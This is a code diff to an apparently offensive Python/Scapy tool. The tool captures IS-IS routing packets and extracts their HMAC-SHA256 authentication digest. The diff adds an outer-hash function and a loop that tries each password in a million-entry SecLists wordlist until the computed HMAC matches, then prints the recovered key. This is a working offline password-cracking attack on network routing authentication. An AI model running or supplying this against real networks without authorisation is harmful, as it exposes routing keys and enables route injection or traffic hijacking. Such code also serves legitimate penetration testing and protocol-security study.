@@ -127,19 +127,24 @@ def send_lldp(packet: Packet):
 
 
 # First-Hash = H(Ko XOR Ipad || (IS-IS PDU))
-def inner_hash(ko: bytes, isis_apad: bytes) -> bytes:
+def get_inner_hash(ko: bytes, isis_apad: bytes) -> bytes:
     kb = ko.ljust(BLOCK_SIZE, b"\x00")                      # 64 bytes, right-padded
     k_ipad = bytes(a ^ b for a, b in zip(kb, IPAD))
     assert len(k_ipad) == BLOCK_SIZE
     return hashlib.sha256(k_ipad + isis_apad).digest()
 
-#def outer_hash():
-
+# Second-Hash = H(Ko XOR Opad || First-Hash)
+def get_outer_hash(ko: bytes, inner_hash: bytes) -> bytes:
+    kb = ko.ljust(BLOCK_SIZE, b"\x00")                      # 64 bytes, right-padded
+    k_opad = bytes(a ^ b for a, b in zip(kb, OPAD))
+    assert len(k_opad) == BLOCK_SIZE
+    return hashlib.sha256(k_opad + inner_hash).digest()
 
 
 def build_isis(packet: Packet):
-    auth = packet[0].getlayer(ISIS_AuthenticationTlv)
-    ko = k_to_ko("toto")
+    t_password = packet[0].getlayer(ISIS_AuthenticationTlv).password
+    t_key = t_password[2:] # Remove 2 first bytes matchin the keyID
+    f_key = ""
     # if auth is not None:
     #     print(auth.type)
     #     print(auth.len)
@@ -147,19 +152,32 @@ def build_isis(packet: Packet):
     #     print(auth.password)
     # Step 1 : Get ISIS PDU
     isis_pdu = packet.getlayer(ISIS_CommonHdr)
-    #isis_pdu.show()
+    #print(key.hex())
     isis_bytes = isis_pdu.original
-    print(isis_bytes.hex())
+    #print(isis_bytes.hex())
     # Step 2 : Remove ISIS authentifcation data. Assume sha2 only for now. Assume no padding for now.
     #isis_pdu_trunc, pad = packet.extract_padding(isis_pdu)
     #isis_pdu_trunc.show()
     isis_bytes_trunc = isis_bytes[:-32]
-    print(isis_bytes_trunc.hex())
+    #print(isis_bytes_trunc.hex())
     isis_apad = isis_bytes_trunc + APAD
-    print(isis_apad.hex())
+    #print(isis_apad.hex())
     # Step 3 : calculate inner hash
-    print(inner_hash(ko, isis_apad).hex())
-
+    print("Expected result: ", t_key.hex())
+    with open('dicts/1000000-password-seclists.txt') as my_dict:
+        for key in my_dict:
+            #print(key)
+            ko = k_to_ko(key.rstrip("\n"))
+            inner_hash = get_inner_hash(ko, isis_apad)
+            outer_hash = get_outer_hash(ko, inner_hash)
+            #print(outer_hash.hex())
+            if t_key.hex() == outer_hash.hex():
+                f_key = key;
+                break;
+    if f_key:
+        print("Key found: ", f_key)
+    else:
+        print("Key not found, try another dictionnary.")
 
 def main():
     # Start ISIS sniffer first in async mode, then start LLDP, so ISIS sniffer is already listening when LLDP triggers auto-sense.
